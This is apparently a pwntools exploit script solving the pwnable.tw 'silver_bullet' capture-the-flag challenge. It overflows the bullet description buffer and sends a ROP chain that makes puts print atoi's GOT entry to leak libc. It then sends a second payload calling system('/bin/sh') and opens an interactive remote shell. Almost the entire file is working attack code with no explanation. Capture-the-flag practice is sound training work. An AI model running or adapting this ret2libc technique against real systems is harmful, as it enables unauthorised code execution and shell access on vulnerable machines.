

from pwn import *
import pdb
import sys


def create(cont):
  p.sendlineafter('Your choice :', '1')
  p.sendlineafter('Give me your description of bullet :', cont)

def powerup(cont):
  p.sendlineafter('Your choice :', '2')
  p.sendafter('Give me your another description of bullet :', cont)

def beat():
  p.sendlineafter('Your choice :', '3')

def leak_libc():
  create('a' * 0x2f)
  powerup('b' * 2)
  
  payload = '\xff'*3 # + 'a' * 4

  payload += p32(atoi_got)
  payload += p32(puts_addr)

  payload += p32(main_addr) + p32(atoi_got)
  
  powerup(payload)

  beat()
  p.recvuntil('Oh ! You win !!\n')
  cont = p.recv(4)

  libc_addr = u32(cont) - atoi_offet
  return libc_addr


DEBUG = False

p = remote('chall.pwnable.tw', 10103)
elf = ELF('./libc_32.so.6')

if DEBUG: 
  p = process('./pwnable/silver_bullet')
  elf = ELF('/lib/i386-linux-gnu/libc.so.6')
  

context.log_level = 'info'

puts_addr = 0x80484A8
atoi_got = 0x804AFF8
main_addr = 0x8048955

system_offset = elf.symbols['system']
bin_offset = list(elf.search('/bin/sh'))[0]
atoi_offet = elf.symbols['atoi']

if __name__ == "__main__":
  pdb.set_trace()
  libc = leak_libc()
  print('libc: {:#x}'.format(libc))

  system_addr = libc + system_offset
  print('system_addr: {:#x}'.format(system_addr))

  bin_addr = libc + bin_offset
  print('bin_addr: {:#x}'.format(bin_addr))

  create('c' * 0x2f)
  powerup('d' * 2)
  
  payload = '\xff'*3 # + 'a' * 4

  payload += p32(bin_addr)
  payload += p32(system_addr)
  payload += p32(main_addr) + p32(bin_addr)

  powerup(payload)

  beat()

  p.interactive()

